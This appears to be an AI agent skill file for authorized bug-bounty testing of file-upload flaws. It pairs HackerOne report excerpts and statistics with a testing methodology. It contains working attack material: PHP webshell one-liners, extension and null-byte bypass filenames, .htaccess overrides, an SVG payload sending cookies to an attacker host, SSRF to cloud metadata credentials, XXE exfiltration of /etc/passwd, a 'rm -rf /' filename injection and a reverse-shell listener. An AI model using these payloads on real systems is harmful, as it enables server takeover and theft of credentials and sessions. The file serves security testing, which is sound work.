---
name: bbhunt-file-upload
description: "Use for upload endpoints and file processing: webshells, SVG/HTML XSS, XXE in documents, path traversal via filename, and server-side image/PDF processing. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# File Upload and File-Handling Flaws — unified skill

> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 55 valid HackerOne reports (12 paid / 22%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| file upload / filename / extension | 43 |
| second-order / stored / blind delivery | 10 |
| JWT / token / base64 decode | 6 |
| HTTP method / verb tampering | 6 |
| WAF / sanitizer / filter bypass | 6 |
| Content-Type / body-format switch | 6 |
| internal service / port / container | 6 |
| encoding / double-encode / null byte | 5 |
| cloud metadata / IAM abuse | 4 |
| public source-code / repo review | 4 |
| header injection (Host / X-Forwarded / etc.) | 4 |
| two-account / cross-account replay | 4 |
| subdomain / DNS / cert-transparency recon | 4 |
| cache / CDN / unkeyed header | 3 |
| XML / SOAP / SAML / XXE | 3 |
| DOM / HTML source inspection | 3 |
| admin / privileged-role context | 2 |
| unauthenticated / removed-cookie test | 2 |
| employee / developer public info | 2 |
| JS bundle / source-map inspection | 2 |
| race / concurrency / timing | 2 |
| OAST / DNS / HTTP callback proof | 2 |
| response diff / status / length comparison | 1 |
| redirect chain / Location header | 1 |
| replay / modify a captured request | 1 |
| API docs / Swagger / introspection | 1 |
| swap object ID / parameter value | 1 |
| public bucket / storage exposure | 1 |
| error message / stack trace probing | 1 |
| intercept & replay request in Burp | 1 |

### Parameters observed in writeups

`src` (5), `width` (4), `height` (4), `onerror` (3), `href` (3), `page` (2), `type` (2), `fwa` (2), `style` (2), `stroke-width` (2), `has_used_cb` (2), `details` (1), `case` (1), `mimetype` (1), `max-age` (1), `boundary` (1), `name` (1), `filename` (1), `xss` (1), `xssi` (1), `version` (1), `encoding` (1), `standalone` (1), `svg` (1), `xmlns` (1), `xlink` (1), `like` (1), `payload` (1)

### Bypass primitives observed

`content-type` (11), `bypass` (6), `bypassed` (4), `open redirect` (2), `whitelist` (2), `bypassing` (1)

### Impact language observed

`rce` (13), `admin` (8), `token` (5), `remote code execution` (4), `arbitrary file` (3), `localhost` (3), `secret` (2), `credential` (2), `exfiltrate` (1), `sensitive data` (1), `unauthorised` (1), `password` (1), `unauthorized` (1)

### Case studies — full excerpts (paid and unpaid)

#### [1547877](https://hackerone.com/reports/1547877) — [Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia

Aiven Ltd · $5000 · critical

## Summary: The Aiven JDBC sink includes the SQLite JDBC Driver. This JDBC driver can be used to upload SQLite database files onto the server. The HTTP sink connector allows sending HTTP requests to localhost. There is unprotected Jolokia listening on `localhost:6725`. JMX exports the `com.sun.management:type=DiagnosticCommand` MBean, which contains the `jvmtiAgentLoad` operation. This operation can be used to execute the SQLite database as JVM Agent by embedding the JVM Agent JAR file inside the SQLite database as an BLOB field in a table. ## Steps To Reproduce: {F1703051} 1. Login into my VPS: `ssh ████`, password: `█████████@` 1. Execute `nc -nlvp 4446` 1. cd to `jdbc-sqlite-jolokia-rce` and run `python3 poc.py` (if running locally, install kafka-python using pip first). 1. Reverse shell connection should now be established to my test instance ## Impact RCE on the Kafka Connect server

#### [401483](https://hackerone.com/reports/401483) — [chaturbate.com] - CSRF Vulnerability on image upload

Chaturbate · $300 · medium

##Summary## Hi guys, One of the features available to a Chaturbate user is the ability to upload images into photo sets. The upload functionality does not use any CSRF tokens, allowing attackers to perform CSRF attacks and upload images to a user's profile without the user's consent. ## Steps To Reproduce: 1. Login to Chaturbate. 2. Browse to your profile page and upload an image. 3. Note the `set` ID of the newly created set (this is available by visiting set in the profile page. It'll be in the URL : ` 4. Download the poc.html file attached to this report. 5. Edit `poc.html` by replacing the number `4771110` by the `set` ID found at step #3. 6. Open poc.html and click on `Submit request`. 7. Visit your Chaturbate image set. You'll notice that the photo set now inludes an additional image (a blank/white image). ## Impact In order for this attack to work, an attacker would need to know the correct photo set ID. Since set IDs are public information, this isn't an issue. I've set the impact here to medium since this affects the integrity of user accounts.

#### [3008878](https://hackerone.com/reports/3008878) — Stored XSS via SVG Upload in chat.line.biz

LY Corporation · $100 · low

The web application allowed users to upload SVG files via chat.line.biz without properly filtering or disabling scripts embedded inside the SVG content. As a result, an attacker could upload a malicious SVG containing JavaScript, and when another user later opened this file in the management interface, the embedded script would be executed in the browser, leading to a stored cross-site scripting (Stored XSS) vulnerability.

#### [1606957](https://hackerone.com/reports/1606957) — Unrestricted File Upload on reddit.secure.force.com

Reddit · $100 · low

## Summary: Reddit.secure.force.com is Reddit SalesForce instance. Attacker is able to send attachments of disallowed filetypes to this server. The attacker is able to send malicious documents such as CVE-2022-30190 Follina to the victim. ## Impact: Attacker can send malicious files to whoever handles the form behind ## Steps To Reproduce: 1. Go to 2. Notice that the specified allowed filetype is: jpg jpeg gif png pdf as you can see with the image below: {F1780944} 3. If you try dragging and dropping a docx file to that box, there is a Javascript which forbids such action. But if you used the "Click to browse" option you can start uploading the file. {F1780957} 4. The file upload request: Here the data parameter contains the base64 encoded version of my clickme.docx file, which is based on the critical Follina vulnerability {F1780963}. This vulnerability can become a [zero click exploit]( 5. Response returns 200, indicated that there is no existing server side check for filetype and the file was uploaded successfully: ## Impact Attacker can send malicious files to whoever handles the form behind

#### [351555](https://hackerone.com/reports/351555) — Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app

Reverb.com · no bounty — still valid · medium

Hi, in file you have hardcoded the following config: where is basic auth details. It shouldn't be disclosed to third parties as official docs say ( > Note: You should only include the in the value, the api secret and key should be left out of the application. I was able to access your account data {F297519} {F297520} Those keys give me ability to not only access the files, but also replace and delete them, change different their settings. Also this url discloses statistics regarding stored files ## Impact Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app

#### [351555](https://hackerone.com/reports/351555) — Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app

Reverb.com · no bounty — still valid · medium

Hi, in file you have hardcoded the following config: where is basic auth details. It shouldn't be disclosed to third parties as official docs say ( > Note: You should only include the in the value, the api secret and key should be left out of the application. I was able to access your account data {F297519} {F297520} Those keys give me ability to not only access the files, but also replace and delete them, change different their settings. Also this url discloses statistics regarding stored files ## Impact Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app

#### [419896](https://hackerone.com/reports/419896) — Unauthenticated user can upload an attachment to the last updated report draft

HackerOne · no bounty — still valid · high

"What, HackerOne resolved a report that was submitted by @jobert?" At HackerOne we often find security vulnerabilities ourselves. In most cases, we find them before new features even make it into production. Sometimes we find them when they're already in the wild. Recently we've launched a new feature called [retesting]( Up until now, HackerOne would always retest our own findings. We're changing that. This is the first report we identified ourselves where we're expanding retesting to the community. When we identified this vulnerability, we filed a ticket to our own bug bounty program instead of filing an internal ticket. We then leveraged the community to retest the vulnerability and allow them to find a bypass. This particular security vulnerability allowed an unauthenticated user to upload attachments and attach them to the last created report draft of other users. This was possible by sending a specially crafted request to the `/attachments` endpoint. Our investigation concluded that this was not abused. Thanks to the hackers that retested this vulnerability!

### Recurring approach patterns from real reports

- 2× description i was able to identify unsafe upload endpoint on the poc go to the upload some test file
- 1× hi when a new driver is registering on uber they have to upload a variety of files proof of insurance id etc
- 1× i was able to access your account data f297519 f297520 those keys give me ability to not only access the files but also replace and delete them change different their settings
- 1× this is the first report we identified ourselves where we re expanding retesting to the community
- 1× when we identified this vulnerability we filed a ticket to our own bug bounty program instead of filing an internal ticket
- 1× this was possible by sending a specially crafted request to the attachments endpoint
- 1× i found an unrestricted file upload on which let me upload anything
- 1× i tested by uploading an executable visual studio community installer and a php file
- 1× i have not tried this but found the below resource about it steps to reproduce
- 1× i observed that when uploading a user avatar picture the first request was sent to with a post parameter contenttype telling the type of file being uploaded
- 1× i changed the value to image svg xml
- 1× now i sent a put request to the presignedurl that we got from the first request with http header content type image svg xml
- 1× for fetching local files from the server itself lfi i created another user named testing68 and uploaded an avatar picture for it
- 1× summary hello i found a critical vunerability in one of your site where user can upload any file type as a profile picture including php file steps to reproduce
- 1× summary hello again lichess team i found an input validation issue in the image upload endpoint that lets me inject special characters into the rel parameter
- 1× while testing upload functionality i noticed that colon characters aren t properly sanitized which could cause parsing issues in other parts of the application description the upload image user rel endpoint doesn t validate the rel parameter properly
- 1× i noticed there s regex parsing logic in findinmarkdown that might not handle malformed imageids correctly this could cause issues in logging image lookup or markdown parsing where the format of imageid is implicitly assumed
- 1× the bug is in cr in resume from lib sendf c when it falls back to reading and discarding through ctx read cb no seek callback available it does not set ctx has used cb

## Corpus-backed method (this class)

1. Map the full pipeline: validation, storage path/name, serving mechanism, and later processing.
2. Identify where the filename is used — storage path, content-disposition, logs, or a shell-out command.
3. Test content-type and extension checks with polyglots and double extensions appropriate to the serving stack.
4. For SVG/HTML served same-origin, test script execution in the document context, not just as an image.
5. For office/PDF/XML uploads, test parser-level SSRF/XXE and external resource loading.
6. Determine whether a stored file is executable by the server; prove RCE only with an unambiguous, bounded callback or output.

### Signals

- Any upload, import, avatar, attachment, or document conversion feature
- Filename or content-type controlled by the client
- Server-side processing with ImageMagick, LibreOffice, PDF renderers

### Kill criteria

- Files are stored outside the web root with a fixed name and no later processing.
- Uploaded content is served from a sandboxed, script-disabled origin with no parser.
- No security-relevant effect beyond accepting an unusual file type.

### Escalation chains

- Upload -> path traversal -> arbitrary write.
- SVG upload -> stored XSS in admin view.
- DOCX upload -> XXE -> SSRF.

### Probes

- Double extension, polyglot content, SVG script, ZIP/tar symlink entry, Content-Disposition filename control.

### Veteran tip

Filename-to-shell-out is a recurring corpus pattern; read the processing code before payload fuzzing.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Test extension/MIME/content-type bypasses and double extensions.
- Try SVG, HTML, polyglot images, and office macros for stored XSS/RCE.
- Check path traversal in filenames and zip-slip in archives.
- Test access control on uploaded files (private vs public, IDOR).
- Look for image processing and thumbnail generation sinks.

### Deeper checklist

- Test extension/MIME/content-type bypasses and double extensions.
- Try SVG, HTML, polyglot images, and office macros for stored XSS/RCE.
- Check path traversal in filenames and zip-slip in archives.
- Test access control on uploaded files (private vs public, IDOR).
- Look for image processing and thumbnail generation sinks.
- Verify execution/rendering, not just successful upload.

### A. Discovery checklist — concrete places, params, headers, file types to look

- Enumerate the whole upload lifecycle, not just the upload form: where the file is stored, what name it gets, whether it is served back, from which directory/origin, and which parser later opens it.
- Classic endpoints: `/upload`, `/avatar`, `/profile-picture`, `/attachment`, `/document`, `/import`, `/export`, `/convert`, `/generate-pdf`, `/screenshot`, `/extract`, `/unzip`.
- Fields to tamper in multipart requests: `filename`, the per-part `Content-Type`, and any sibling fields such as `uploadPath`/`directory`/`type` that influence the destination path or MIME mapping.
- JSON/ODATA-style uploads carry metadata instead of raw multipart: `fileName`, `fileType`, `uploadData.content` — test each independently (2026 Hackrate case: client-side-only `.txt/.md` allowlist with no server validation).
- Server config override files: `.htaccess` (Apache), `web.config` (IIS), `.user.ini` — check whether they can be uploaded and whether the upload dir is configured to process them.
- Alternative executable extensions by stack: PHP `.php .phtml .php5 .php7 .pht .phar`; ASP/ASPX `.asp .aspx .asa .cer .soap`; JSP `.jsp .jspx .jsw .jsv .jspf`; plus `.shtml`, `.cgi`, `.pl`, `.cfm`.
- Non-RCE impact formats: `.svg` (XSS/XXE/SSRF), `.html` (stored XSS, `.hta` for client-side RCE), `.csv` (CSV injection), `.xml`/`.docx`/`.xlsx` (XXE), `.zip` (Zip Slip), `.avi` (LFI/SSRF).
- File-URL signer endpoints: inspect base64 policy fields for missing key-prefix, content-length, content-type, or expiry conditions — anonymous `?max-keys=1` can find buckets with ListBucket enabled separately from GetObject.

### Signals and surfaces

### Signal

- Reports: **100** · paid: **20**
- Median bounty **$400** · p90 **$4,000** · max **$5,000** · total **$21,500**
- Median upvotes **14**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitHub Security Lab | 4 | $7,800 | 327 |
| Aiven Ltd | 1 | $5,000 | 56 |
| Mail.ru | 5 | $4,150 | 431 |
| Slack | 3 | $1,700 | 107 |
| Visma Public | 3 | $750 | 570 |
| TikTok | 3 | $750 | 221 |
| Linktree | 1 | $750 | 33 |
| Chaturbate | 1 | $300 | 17 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`avatar` `upload` `file` `attachment` `document` `image` `import` `archive`

### Techniques, payloads and bypasses

### Payloads & probes

- `shell.php.jpg` `shell.pHp` `shell.php%00.jpg` `shell.svg`
- `.htaccess` -> `AddType application/x-httpd-php .jpg`
- SVG -> `<svg onload=alert(1)>`
- Zip -> `../../../../var/www/shell.php`

### Bypass tricks

- Content-type spoofing, magic-byte prefixing, and polyglots.
- Double extension, trailing dot/space, and case tricks.
- Race the upload validation or overwrite an existing file.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Webshell via File Upload on ecjobs.starbucks.com.cn** — `#506646` · Starbucks · $0 · ▲688
  > I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.
- **Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg** — `#1027822` · Starbucks · $0 · ▲247
  > ko2sec discovered an .ashx endpoint on mobile.starbucks.com.sg intended for image files permitted unrestricted file type uploads which could lead to a potential RCE.
- **Unrestricted File Upload on https://partner.tiktokshop.com/wsos_v2/oec_partner/upload** — `#1890284` · TikTok · $0 · ▲118
  > An unrestricted file upload vulnerability was found on a partner.tiktokshop.com endpoint, where if the content-type in the header was changed, any extension could be uploaded.
- **Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover** — `#3115705` · Dust · $0 · ▲118
  > This allows an attacker to issue authenticated API requests on behalf of the victim, including:
- **Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app** — `#351555` · Reverb.com · $0 · ▲96
  > Also this url https://api.cloudinary.com/v1 1/reverb/usage discloses statistics regarding stored files
- **Unrestricted file upload leads to Stored XSS** — `#880099` · GitLab · $0 · ▲90
  > `<?xml version="1.0" standalone="no"? <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" <svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"
- **Unauthenticated user can upload an attachment to the last updated report draft** — `#419896` · HackerOne · $0 · ▲87
  > This was possible by sending a specially crafted request to the `/attachments` endpoint.
- **Unrestricted File Upload at ██████████** — `#2357778` · Mars · $0 · ▲78
  > The endpoint "████████" enables unrestricted file uploads, meaning anyone on the internet, without registration, can upload any type of file.
- **ImageId Format Injection in Image Upload Endpoint** — `#3175928` · Lichess · $0 · ▲73
  > The `/upload/image/user/{rel}` endpoint doesn't validate the `rel` parameter properly.
- **Cross site scripting via file upload in subdomain ads.tiktok.com** — `#1433125` · TikTok · $500 · ▲65
  > Due to missing checks it was possible to upload .svg files which contained XSS payload.
- **Singapore - Unrestricted File Upload Leads to XSS on campaign.starbucks.com.sg/api/upload** — `#883151` · Starbucks · $0 · ▲61
  > ko2sec discovered it was possible to upload arbitrary content on https://campaign.starbucks.com.sg/api/upload, leading to a stored XSS.
- **Remote Code Execution (upload)** — `#116575` · Legal Robot · $0 · ▲60
  > Any file upload was accepted without filter, which led to RCE vulnerability.
- **XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com** — `#964550` · Shopify · $0 · ▲58
  > https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Files/xss comment exif metadata double quote.png
- **Unrestricted File Upload Results in Cross-Site Scripting Attacks** — `#1005355` · Uber · $0 · ▲58
  > It was found that an attacker can upload any type of file including HTML files when adding a menu during the onboarding process after signing up at https://www.ubereats.com/restaurant/en-CA/signup.
- **[Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia** — `#1547877` · Aiven Ltd · $5,000 · ▲56
  > cd to `jdbc-sqlite-jolokia-rce` and run `python3 poc.py` (if running locally, install kafka-python using pip first).
- **Stored XSS via SVG Upload in chat.line.biz** — `#3008878` · LY Corporation · $100 · ▲40
  > The web application allowed users to upload SVG files via chat.line.biz without properly filtering or disabling scripts embedded inside the SVG content.
- **Unrestricted File Upload Blind Stored Xss  in subdomain ads.tiktok.com** — `#1577370` · TikTok · $250 · ▲38
  > A blind stored Cross-Site Scripting (XSS) vulnerability was found on a TikTok Ads domain via uploaded file.
- **Unrestricted File Upload on reddit.secure.force.com** — `#1606957` · Reddit · $100 · ▲34
  > This vulnerability can become a [zero click exploit](https://innovatecybersecurity.com/security-threat-advisory/follina-zero-day-allows-zero-click-rce-from-office-docs/).
- **RCE via File Upload  with a Null Byte Truncated File Extension at https://██████/** — `#2054184` · U.S. Dept Of Defense · $0 · ▲33
  > I found "repos" at `https://███/` and `https://c█████████/` and this one (which doesn't have the file upload functionality appearing on the DOM, but it still may be there) `https://███████`.
- **Unrestricted File Upload on https://app.lemlist.com** — `#722919` · lemlist · $0 · ▲24
  > i found an Unrestricted File Upload on https://app.lemlist.com which let me upload anything.
- **SSRF & unrestricted file upload on https://my.stripo.email/** — `#771382` · Stripo Inc · $0 · ▲24
  > The researcher discovered an SSRF & unrestricted file upload (Remote code execution ) vulnerabilities .
- **File Upload XSS in image uploading of App in mopub** — `#97672` · X / xAI · $0 · ▲24
  > Referer: https://app.mopub.com/inventory/app/97142808ce5d4ace895480a3ffe7d631/
- **Unrestricted File Upload on https://auth.ratelimited.me** — `#463604` · RATELIMITED · $0 · ▲23
  > Have found a way to upload files that aren't images on https://auth.ratelimited.me/
- **Low privileges (auth) Remote Command Execution - PHP file upload bypass.** — `#841397` · ExpressionEngine · $0 · ▲22
  > ExpressionEngine was vulnerable to unrestricted file upload via a low-privileged user due to a bypass extension check that led to remote command execution.
- **Arbritrary file Upload on AirMax** — `#73480` · Ubiquiti Inc. · $0 · ▲21
  > An attacker can bypass the device's authentication mechanisms by exploiting this vulnerability.
- **Unrestricted Upload of File with Dangerous Type** — `#1081766` · Enjin · $0 · ▲20
  > The security researcher was able to execute [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html) through a legacy API endpoint used to upload images.
- **Unauthenticated arbitrary file upload on the https://█████/ (█████████)** — `#698789` · U.S. Dept Of Defense · $0 · ▲19
  > 3) Visit `https://███/delete.me` and you will see your uploaded file there
- **[chaturbate.com] - CSRF Vulnerability on image upload** — `#401483` · Chaturbate · $300 · ▲17
  > Edit `poc.html` by replacing the number `4771110` by the `set` ID found at step 3.
- **[█████] Bug Reports allow for Unrestricted File Upload** — `#1850065` · U.S. Dept Of Defense · $0 · ▲16
  > Intercept the `HTTP` request and change the extension of the attached file to one that is not allowed
- **[OPEN S3 BUCKET] All uploaded files are public.** — `#905641` · Courier · $0 · ▲16
  > https://s3.amazonaws.com/backend-production-librarybucket-1izigk5lryla9/85abcc94-a7db-4529-b0aa-826e3026c8c1/1592856757262 camion2.svg

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 3× | `cr_in_resume_from()` |
| 3× | `ctx->read_cb` |
| 3× | `cr_in_needs_rewind()` |
| 3× | `http_resume()` |
| 2× | `ctx->has_used_cb` |
| 2× | `ctx->has_used_cb = TRUE` |
| 2× | `curl_multi_remove_handle() returned 8 / API function called from within callback / No ASAN crash` |
| 1× | `https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}` |
| 1× | `PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}` |
| 1× | `val image = PicfitImage( / id = ImageId(s"$rel:${ThreadLocalRandom.nextString(8)}.$extension"), / // rel parameter used directly without val` |
| 1× | `curl -X POST "https://lichess.org/upload/image/user/test:evil:format:break" \ / -b "lila2=YOUR_SESSION_COOKIE" \ / -H "Origin: https://liche` |
| 1× | `/upload/image/user/{rel}` |
| 1× | `{rel}:{random12}:{random8}.{extension}` |
| 1× | `$ne` |
| 1× | `exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png` |
| 1× | `█████████@` |
| 1× | `<iframe srcdoc="&#x3c;script src='/file-upload/<UPLOAD ID>/payload.js?download'></script>">` |
| 1× | `.html()` |
| 1× | `SV_AddResource (t_eventscript, filename, FS_FileSize (filename), RES_FATALIFMISSING, 0);` |
| 1× | `alert(XSS)` |

### Content-Type Bypass

```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Establish the validation model with three probes: real PHP renamed `.jpg` (tests content inspection), real JPEG renamed `.php` (tests extension allowlist), real JPEG with `Content-Type: application/x-php` (tests MIME/extension consistency). This reveals exactly which layers are real (2026 $13,500 polyglot writeup).
- Content-Type bypass: `filename=shell.php` with per-part `Content-Type: image/jpeg` — works only if the server trusts the declared MIME.
- Extension obfuscation: `shell.php.jpg`, `shell.jpg.php`, `.pHp`, `.pHP5`, trailing `shell.php.`, URL-encoded `exploit%2Ephp`, and semicolon/null-byte forms `exploit.asp;.jpg`, `exploit.asp%00.jpg`.
- Non-recursive stripping bypass: if the app removes `.php`, name the file `exploit.p.phphp` so one removal leaves `.php`.
- NTFS ADS on IIS: `shell.asp:.jpg`, `shell.php::$DATA` — reject any filename containing `:`. IIS also converts `"`→`.`, `<`→`*`, `>`→`?` when `Content-Disposition` uses single quotes.
- Multibyte conversion: `\xC0\x2E`, `\xC4\xAE`, `\xC0\xAE` may become `.` after UTF-8→ASCII normalisation.
- Polyglot web shell (PortSwigger lab): `exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" input.jpg -o polyglot.php` — passes magic-byte/dimension checks while executing as PHP.
- Phar/JPEG polyglot: prepend image magic to a PHAR with `__HALT_COMPILER();` metadata, upload via avatar, then trigger `phar://uploads/poly.jpg/x` through `file_exists()`/`getimagesize()` (OpenMage CVE-2026-25524).
- .htaccess override: upload `AddType application/x-httpd-php .smh` with `Content-Type: text/plain`, then upload `exploit.smh`.
- Path traversal in the upload destination: set `uploadPath=../temp`, `uploadPath=..%2f..%2ftrav`, or `uploadPath=/tmp/dir` and check the returned URL for reflected traversal.
- Race conditions: upload-then-delete validation windows (AV scanners), or brute-force `uniqid()`-generated temp directories — enlarge the window with a large padded file whose payload is at the start.
- `PUT` upload: send `OPTIONS` to discover endpoints advertising PUT, then `PUT /images/exploit.php` with `Content-Type: application/x-httpd-php`.
- Parser exploitation without RCE: SVG `<script>` stored XSS, DOCX/XLSX XXE, ImageMagick MVG `fill 'url(http://169.254.169.254/...)'` and SVG `<image xlink:href=...>` SSRF, ffmpeg m3u8/concat SSRF, headless-Chrome PDF `@import`/iframe/file:// reads.

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### C. Validation / proof bar — how to confirm and avoid false positives

- A file that uploads but is never served, executed, or parsed is a write-only blob — not a finding. Prove the full round trip.
- RCE requires actual command output (`whoami`/`id`) from the uploaded shell, or an OOB callback emitted by it. "The file was accepted" is not execution.
- Check the `Content-Type` response header on the retrieved file — if the server serves it as `text/plain`, source disclosure may be the real impact instead of RCE.
- Stored XSS requires the script to actually fire in a victim browser, same origin as the upload; confirm the file is not sandboxed by a separate download domain or `Content-Disposition: attachment`.
- Blind upload-to-write: prove the write reached the real filesystem (directory-creation failures as an oracle), then find a secondary processor (cron, parser) to reach execution — do not assume execution from a UUID-renamed file you cannot read back.
- Distinguish client-side-only restrictions from server enforcement by replaying the request through a proxy with the UI bypassed.
- For polyglots, verify the file is still recognised as an image (`file`, `getimagesize()`) *and* that the payload survives any re-encoding (GD strips metadata — ICO files are a known exception).
- For XXE/SSRF via uploads, apply the same proof bar as the parent class: real file content or a Collaborator hit carrying data, not merely a DNS ping.
- Severity: confirmed shell RCE → Critical (CVSS 9.8 examples are common); stored XSS / same-origin script → High; write-only upload with no retrieval or execution → Informational.

**PortSwigger lab-to-technique map (use as a testing sequence):**
1. No restrictions → upload `<?php echo system($_GET['command']); ?>` and request it directly.
2. Content-Type restriction → replay with `Content-Type: image/jpeg` on the file part.
3. Path traversal → place the shell outside the upload directory via the filename.
4. Extension blacklist → upload `.htaccess` (`AddType application/x-httpd-php .smh`) plus `shell.smh`.
5. Obfuscated extension → `shell.php%00.jpg`, `shell.php.` or `shell%2Ephp`.
6. Content inspection → ExifTool polyglot JPEG/PHP.
7. Race condition → upload-then-delete or URL-fetch temp-directory brute-force.
8. No RCE → HTML/SVG stored XSS or XML/Office parser XXE.

**OWASP validation-layer checklist (invert each into a bypass test):**
- Extension allowlist — test double extensions, case variants, trailing dots/whitespace, encoded dots, null bytes, NTFS ADS.
- Content-Type validation — remember it is user-supplied; test declared-vs-actual mismatches.
- File signature validation — polyglots and metadata-embedded payloads defeat signature-only checks.
- Filename safety — `../`, absolute paths, colons, backslashes, overlong Unicode.
- Storage location — outside web root / random names defeat direct retrieval but may hand off to a parser.
- Permissions — filesystem execute bits, directory handler config, separate download origin.

**Common reasons an upload test fails:**
- The server re-encodes images with GD/LibreOffice, stripping metadata payloads (try ICO or an XXE in a part GD does not rewrite).
- The upload directory is served from a cookieless/CDN domain — XSS there cannot steal the app's cookies.
- The generated filename is a UUID with a forced extension — pivot to path traversal in a directory field or a secondary parser.
- The declared `Content-Type` is overwritten to `application/octet-stream` — client-side execution may be impossible.
- A WAF blocks `<?php` — use a short echo tag `<?= ... ?>`, a polyglot, or an image-metadata payload.

### Escalation and related chains

### Escalation chains

- Upload -> XSS.
- Upload + parser -> RCE.
- Zip slip -> file write.

### Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover

`#3115705` · Dust · $0 · high · 2025-05-02 · ▲118
> A stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality. An attacker can upload a malicious HTML file to a conversation. When another user, including an admin, visits the uploaded file, JavaScript is executed in their authenticated browser session.

### Related Skills & Chains

- **`rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.

---

### Related Skills & Chains

